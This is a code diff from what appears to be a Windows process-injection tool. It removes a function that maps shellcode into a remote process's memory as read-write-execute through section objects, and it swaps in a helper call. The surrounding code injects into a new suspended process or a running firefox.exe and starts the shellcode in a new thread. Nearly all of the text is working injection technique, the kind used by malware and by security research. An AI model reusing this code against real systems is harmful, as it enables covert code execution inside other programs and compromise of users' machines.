@@ -6,6 +6,7 @@
 #include "enumproc.h"
 
 #include "payload.h"
+#include "map_buffer_into_process.h"
 
 typedef enum {
     ADD_THREAD,
@@ -22,54 +23,6 @@ typedef enum {
 
 using namespace std;
 
-PVOID map_code_into_process(HANDLE hProcess, LPBYTE shellcode, SIZE_T shellcodeSize)
-{
-    HANDLE hSection = NULL;
-    OBJECT_ATTRIBUTES hAttributes;
-    memset(&hAttributes, 0, sizeof(OBJECT_ATTRIBUTES));
-
-    LARGE_INTEGER maxSize;
-    maxSize.HighPart = 0;
-    maxSize.LowPart = shellcodeSize;
-    NTSTATUS status = NULL;
-    if ((status = ZwCreateSection( &hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
-    {
-        printf("[ERROR] ZwCreateSection failed, status : %x\n", status);
-        return NULL;
-    }
-    printf("Section handle: %x\n", hSection);
-
-    PVOID sectionBaseAddress = NULL;
-    SIZE_T viewSize = 0;
-    SECTION_INHERIT inheritDisposition = ViewShare; //VIEW_SHARE
-
-    // map the section in context of current process:
-    if ((status = NtMapViewOfSection(hSection, GetCurrentProcess(), &sectionBaseAddress, NULL, NULL, NULL, &viewSize, inheritDisposition, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
-    {
-        printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
-        return NULL;
-    }
-    printf("Section BaseAddress: %p\n", sectionBaseAddress);
-
-    memcpy (sectionBaseAddress, shellcode, shellcodeSize);
-    printf("Shellcode copied!\n");
-
-    //map the new section into context of opened process
-    PVOID sectionBaseAddress2 = NULL;
-    if ((status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress2, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
-    {
-        printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
-        return NULL;
-    }
-
-    //unmap from the context of current process
-    ZwUnmapViewOfSection(GetCurrentProcess(), sectionBaseAddress);
-    ZwClose(hSection);
-
-    printf("Section mapped at address: %p\n", sectionBaseAddress2);
-    return sectionBaseAddress2;
-}
-
 bool inject_in_new_process(INJECTION_POINT mode)
 {
     //get target path
@@ -80,13 +33,14 @@ bool inject_in_new_process(INJECTION_POINT mode)
     if (!get_dir(cmdLine, startDir)) {
         GetSystemDirectory(startDir, MAX_PATH);
     }
+    printf("Target: %S\n", cmdLine);
     //create suspended process
     PROCESS_INFORMATION pi;
     memset(&pi, 0, sizeof(PROCESS_INFORMATION));
     if (create_new_process2(pi, cmdLine, startDir) == false) {
         return false;
     }
-    LPVOID remote_shellcode_ptr = map_code_into_process(pi.hProcess, g_Shellcode, sizeof(g_Shellcode));
+    LPVOID remote_shellcode_ptr = map_buffer_into_process1(pi.hProcess, g_Shellcode, sizeof(g_Shellcode), PAGE_EXECUTE_READWRITE);
     switch (mode) {
     case ADD_THREAD:
         run_shellcode_in_new_thread(pi.hProcess, remote_shellcode_ptr, THREAD_CREATION_METHOD::usingRandomMethod);
@@ -115,7 +69,7 @@ bool inject_in_new_process(INJECTION_POINT mode)
 bool inject_in_existing_process()
 {
     HANDLE hProcess = find_running_process(L"firefox.exe");
-    LPVOID remote_shellcode_ptr = map_code_into_process(hProcess, g_Shellcode, sizeof(g_Shellcode));
+    LPVOID remote_shellcode_ptr = map_buffer_into_process1(hProcess, g_Shellcode, sizeof(g_Shellcode), PAGE_EXECUTE_READWRITE);
     if (remote_shellcode_ptr == NULL) {
         return false;
     }
